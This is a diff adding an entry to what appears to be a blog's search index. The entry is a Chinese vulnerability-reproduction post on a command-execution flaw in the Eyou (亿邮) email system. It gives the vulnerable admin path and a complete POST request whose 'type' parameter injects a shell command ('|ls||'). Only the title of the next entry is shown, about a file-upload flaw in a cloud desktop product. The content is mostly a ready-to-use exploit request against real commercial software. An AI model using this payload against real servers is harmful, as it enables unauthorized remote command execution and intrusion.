@@ -31,6 +31,33 @@
     
     
     <entry>
+      <title>亿邮电子邮件系统 命令执行</title>
+      <link href="2021/04/10/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+      <url>2021/04/10/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建环境"><a href="#自行搭建环境" class="headerlink" title="自行搭建环境"></a>自行搭建环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%BF%E9%82%AE1.webp" alt="image"></p><h3 id="漏洞路径"><a href="#漏洞路径" class="headerlink" title="漏洞路径"></a>漏洞路径</h3><pre><code>/webadm/?q=moni_detail.do&amp;action=gragh</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%BF%E9%82%AE2.webp" alt="image"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><pre><code>POST /webadm/?q=moni_detail.do&amp;action=gragh HTTP/1.1Host: 192.168.1.87User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 12type=&#39;|ls||&#39;</code></pre><p> <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BA%BF%E9%82%AE3.webp" alt="image"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> rce </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>和信下一代云桌面 文件上传</title>
       <link href="2021/04/10/%E5%92%8C%E4%BF%A1%E4%B8%8B%E4%B8%80%E4%BB%A3%E4%BA%91%E6%A1%8C%E9%9D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
       <url>2021/04/10/%E5%92%8C%E4%BF%A1%E4%B8%8B%E4%B8%80%E4%BB%A3%E4%BA%91%E6%A1%8C%E9%9D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
